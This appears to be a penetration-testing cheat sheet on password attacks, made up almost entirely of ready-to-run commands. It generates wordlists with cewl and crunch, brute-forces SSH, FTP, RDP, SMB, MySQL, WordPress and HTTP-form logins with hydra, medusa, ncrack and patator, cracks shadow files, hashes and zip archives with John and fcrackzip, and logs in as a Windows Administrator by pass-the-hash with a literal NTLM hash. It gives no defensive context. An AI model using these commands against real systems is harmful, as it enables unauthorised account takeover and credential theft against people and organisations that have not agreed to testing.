# Password Attacks

- [Lists](#lists)
- [Guessing](#guessing)
- [Cracking](#cracking)


## Lists

### Generate Password List
```
cd /opt/wordhound && python Main.py wordhound
cewl -d 2 -m 5 -w words.txt $site 2>/dev/null
```
### Then MANGLE with John
```
john --wordlist=words.txt --rules --stdout > mangled_words.txt
```

### Spiderfoot
```
python ./sf.py && firefox hxxp://127.0.0.1:5001/
```

### Wordlist of passwords 6 characters long containing specific characters
```
crunch 6 6 0123456789ABCDEF -o list.txt
```

### Wordlist using pre-defined character sets
```
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt
```

### Wordlist with pattern such as abc$%#123
```
crunch 8 8 -t ,@@^^%%% |more
```

## Guessing

### Password Guessing
     medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 20 http
     medusa -H hosts -C usersandhashes -M smbnt -m PASS:HASH | grep "Access Allowed" smb
     wfuzz -c -z file,/root/wordlist.txt -hs Invalid -hs incorrect -d "log=FUZZ&pwd=aaaa" http://$ip/path.php
     ncrack -v -f --user admin -P passwords rdp://$ip,CL=1 rdp
     patator mysql_login user=root password=FILE0 0=/root/passes.txt host=$ip -x ignore:fgrep='denied' mysql dictionary attack

### Guess an HTTP form with a field named "key"
```
hydra $ip http-form-post "/kzMb5nVYJw/:key=^PASS^:invalid key" -l "" -P passwords.txt -t 10 -w 30 -o hydra-http.txt
hydra $ip http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -l "admin" -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http.txt
```
```
hydra -s 22 -l demonslayer -P /usr/share/wordlists/rockyou.txt 10.0.2.5 ssh
ncrack -p 22 --user root -P passwords -T5 $ip ssh
```
```
hydra -l elly -e nsr 92.168.1.135 ftp
ncrack -u root -P passwords -T 5 $ip -p 21 ftp
hydra -l admin -P password-file.txt -v $ip ftp ftp
hydra -L users -P passwords -f -u $ip -s 21 ftp ftp
```

## Cracking

### Crack Shadowfile
```
unshadow passwd shadow > unshadow.txt
john -–single unshadow.txt
john --show unshadow.txt
```

### Crack Hash
```
firefox crackstation.net &
firefox onlinehashcrack.com &
firefox hashkiller.co.uk &
john jhashes.txt -wordlist=/usr/share/wordlists/rockyou.txt
```
```
pth-winexe -U WIN-PAQJG3GR43J/Administrator%aad3b435b51404eeaad3b435b51404ee:54d99af9cebee2444c1684ac33dadb1e //192.168.38.161 cmd
```

### Crack Zip File
```
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u Whistler.zip
fcrackzip -D -u -p bfforzip.txt ~/Downloads/t0msp4ssw0rdz.zip
```
